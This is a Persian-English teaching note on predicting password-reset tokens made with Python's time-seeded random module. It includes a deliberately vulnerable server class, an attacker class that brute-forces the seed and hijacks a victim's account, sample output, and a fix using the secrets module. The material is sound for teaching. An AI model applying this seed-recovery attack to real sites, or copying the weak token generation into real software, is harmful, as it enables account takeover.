---
Episode: E1
Date: 2026-04-25T18:28:00
Title: Web Attacks Codes
tags:
  - Web_Attack
  - web_pentest
  - Web_Developing
Categories:
  - Web Attack
  - Web Pentesting
Is Finished?:
Practice Status:
Spend Time:
Tools:
banner:
banner_icon:
Home:
Previous Episode:
Next Episode:
---
-------
## Web Attack Implementation Codes
### PRNG Reset Attack(Pseudorandom Token Prediction)
#### Teacher Notes
- **نمایش زنده:** 
	1. اول کد آسیب‌پذیر را اجرا کنید و موفقیت حمله را نشان دهید. 
	2. سپس یک خط `random` را به `secrets` تغییر دهید و دوباره حمله را اجرا کنید.
	3. دانشجویان می‌بینند که Brute Force شکست می‌خورد. این "قبل و بعد" بهترین تأثیر آموزشی را دارد.
#### Attack Implementation
1. **PRNG Token Prediction Attack Simulation | Description**
	1. حمله به توکن‌های بازیابی رمز عبور با پیش‌بینی Seed
	2. **سناریو:**
		1. یک وب‌سایت از `random.randint()` برای تولید توکن بازیابی رمز استفاده می‌کند.
		2. مهاجم با چند بار درخواست، Seed را کشف می‌کند.
		3. سپس توکن قربانی را قبل از خودش می‌زند.
2. **Server Codes:**
	1. فرض کنید وبسایتی با استفاده از تکه کد زیر توکن های مدیریتی را تولید و بررسی میکند:
```python
import random
import time
import hashlib

# ============================================================
# Section 1: Server Side - Not Attack Codes only Simulate Vuln Server
# ============================================================

class VulnerableServer:
    """Server use random() - Vulnerable"""
    
    def __init__(self):
        #Seed == time.time() - using time for seed is a big mistake
        random.seed(int(time.time()))
        self.generated_tokens = []
    
    def generate_reset_token(self, user_email):
        """Generate 6 Number Token - Vuln Method"""
        token = random.randint(100000, 999999)
        self.generated_tokens.append((user_email, token))
        return token
    
    def reset_password(self, email, token, new_password):
        """Check Token and Change Password"""
        #In Real world Token Save into Database
        if (email, token) in self.generated_tokens:
            print(f"  ✅ رمز {email} با موفقیت به '{new_password}' تغییر کرد!")
            self.generated_tokens.remove((email, token))
            return True
        print(f"  ❌ توکن نامعتبر برای {email}")
        return False

```
3. **Attack Codes:**
	1. این تکه کد اصلی شبیه سازی حمله است. در واقع برای پیش بینی Seed و سپس توکن از این قسمت باید استفاده کنیم.
```python
#!/usr/bin/env python3
import random
import time
#============================================================
#Section 2: Attack Simulation Codes
#============================================================

class Attacker:
    """ Attacker Discover Seed and Predicate Token """
    
    def __init__(self, server):
        self.server = server
        self.recovered_seed = None
    
    def recover_seed(self):
        """ Phase 1: Discover Seed using Some Request from US """
        print("\n[🔍 فاز ۱: کشف Seed]")
        print("-" * 40)
        
        #زمان تقریبی الان را می‌گیریم
        #Get current time 
        now = int(time.time())
        
        #ارسال ۳ بار درخواست و جمع آوری توکن‌ها
        #Send 3 Request and Collect tokens
        my_tokens = []
        for i in range(3):
            token = self.server.generate_reset_token(f"attacker{i}@test.com")
            my_tokens.append(token)
            print(f"  درخواست {i+1}: توکن = {token}")
            time.sleep(0.1)  #low delay between requests
        
        #مقدار سیید چند ثانیه اخیر را امتحان می‌کنیم
        #brute force: Try Seed from Last Seconds
        print(f"\n  🔓 Brute force روی Seed های {now-10} تا {now}...")
        
        for candidate_seed in range(now - 10, now + 1):
            random.seed(candidate_seed)
            
            #تولید ۳ توکن اول با مقدار سیید محاسبه شده
            #Generate 3 first Token using Calculated Seed
            predicted = [random.randint(100000, 999999) for _ in range(3)]
            
            if predicted == my_tokens:
                self.recovered_seed = candidate_seed
                print(f"✅ Seed Discovered: {candidate_seed}")
                print(f"📅 Time: {time.ctime(candidate_seed)}")
                return candidate_seed
        
        print("❌ Seed Dont Found!")
        return None
    
    def predict_next_token(self):
        """فاز ۲: پیش‌بینی توکن بعدی (متعلق به قربانی)"""
        """ Phase 2: Predicate Next Token(for Victim)"""
        print("\n[🎯 Phase 2: Predicate Victim Token]")
        print("-" * 40)
        
        if not self.recovered_seed:
            print("  ❌ First you Shoud Discover Seed!")
            return None
        
        #سیید را دوباره تنظیم و ۳ توکن قبلی را رد کن
        #Set Seed again and Skip 3 last tokens
        random.seed(self.recovered_seed)
        for _ in range(3):
            random.randint(100000, 999999)
        
        #Fourth Token == Victim Token
        victims_token = random.randint(100000, 999999)
        print(f"🎲 Predicted Token for Victim: {victims_token}")
        return victims_token
    
    def hijack_account(self, victim_email, new_password, predicted_token):
        """فاز ۳: ربودن حساب قربانی"""
        """ Phase 3: Victim Session Hijacking """
        print(f"\n[💀 Phase 3: Hijacking Victim Session: {victim_email}]")
        print("-" * 40)
        print(f"🚀Send Predicated Token of Victim: {predicted_token}")
        self.server.reset_password(victim_email, predicted_token, new_password)

```
3. **Running Simulation:**
	- برای اجرای کلی شبیه ساز باید هر دو بخش Server و Attack را در یک فایل کلی بنویسیم.
	- سپس قسمت زیر را نیز در آخر دو بخش قبلی اضافه میکنیم تا توابع مورد نیاز را فراخوانی کند.
```python
#============================================================
#Section 3: Live Show Attack
#============================================================

def demonstrate_attack():
    print("=" * 60)
    print("🛡️ PRNG Prediction Attack Simulation")
    print("=" * 60)
    print("""
📋 سناریو:
  ۱. یک وب‌سایت از random.randint() برای توکن بازیابی رمز استفاده می‌کند
  ۲. Seed بر اساس time.time() تنظیم می‌شود
  ۳. مهاجم ۳ بار درخواست بازیابی برای خودش می‌دهد
  ۴. Seed را با Brute Force کشف می‌کند
  ۵. توکن بعدی را پیش‌بینی می‌کند (مال قربانی)
  ۶. حساب قربانی را می‌رباید!
    """)
    
    #Create Vuln Server
    server = VulnerableServer()
    attacker = Attacker(server)
    
    #Victim Email
    victim = "admin@company.com"
    
    #Start Attack
    attacker.recover_seed()
    predicted = attacker.predict_next_token()
    
    if predicted:
        #حالا قربانی درخواست بازیابی می‌دهد (اما ما جلو زدیم!)
        print(f"\n  😢 {victim} درخواست بازیابی رمز داد...")
        real_token = server.generate_reset_token(victim)
        print(f"  📧 توکن واقعی ارسال شده به ایمیل: {real_token}")
        print(f"  🎯 توکن پیش‌بینی شده توسط مهاجم: {predicted}")
        
        if real_token == predicted:
            print("\n  ⚠️  تطابق کامل! مهاجم موفق شد!")
            # مهاجم قبل از قربانی اقدام می‌کند
            attacker.hijack_account(victim, "Hacked123!", predicted)
            
            # قربانی سعی می‌کند با توکن ایمیلش رمز را عوض کند
            print(f"\n  😢 {victim} سعی می‌کند با توکن {real_token} رمز را عوض کند...")
            server.reset_password(victim, real_token, "MyNewPass123")
            print("  ⚠️  دیگر کار نمی‌کند! مهاجم قبلاً رمز را عوض کرده است.")
    
    print("\n" + "=" * 60)
    print("📚 نتیجه درس:")
    print("  هرگز از random() برای تولید توکن امنیتی استفاده نکن!")
    print("=" * 60)

if __name__ == "__main__":
    demonstrate_attack()
```
4. **Output Sample:**
```text
🛡️  شبیه‌ساز آموزشی PRNG Prediction Attack

[🔍 فاز ۱: کشف Seed]
  درخواست 1: توکن = 847291
  درخواست 2: توکن = 563901
  درخواست 3: توکن = 120384
  ✅ Seed کشف شد: 1715123456

[🎯 فاز ۲: پیش‌بینی توکن قربانی]
  🎲 توکن پیش‌بینی شده: 998273

  😢 admin@company.com درخواست بازیابی رمز داد...
  📧 توکن واقعی: 998273
  🎯 توکن پیش‌بینی شده: 998273
  ⚠️  تطابق کامل!

[💀 فاز ۳: ربودن حساب]
  ✅ رمز admin@company.com به 'Hacked123!' تغییر کرد!
  ❌ توکن نامعتبر - مهاجم قبلاً حساب را ربوده!
```
#### Harden Codes
1. **Secure Code Generation:**
	1. اگر برای تولید توکن از روش زیر استفاده کنیم این حمله قابل پیاده سازی نیست.
```python
#!/usr/bin/env python3
"""نسخه امن - همین حمله جواب نمی‌دهد"""

import secrets

class SecureServer:
    def generate_reset_token(self, user_email):
        #با secrets، هیچ Seed ای برای کشف وجود ندارد
        token = secrets.randbelow(900000) + 100000
        #یا بهتر:
        #token = secrets.token_urlsafe(32)
        return token


#تست: حمله را روی نسخه امن امتحان کنید
secure = SecureServer()
tokens = [secure.generate_reset_token("test@test.com") for _ in range(10)]

print("توکن‌های تولید شده با secrets:")
for i, t in enumerate(tokens):
    print(f"  {i+1}: {t}")

print("\n❌ هیچ الگویی قابل پیش‌بینی نیست!")
print("✅ مهاجم نمی‌تواند Seed را کشف کند چون اصلاً Seed وجود ندارد!")
```
### !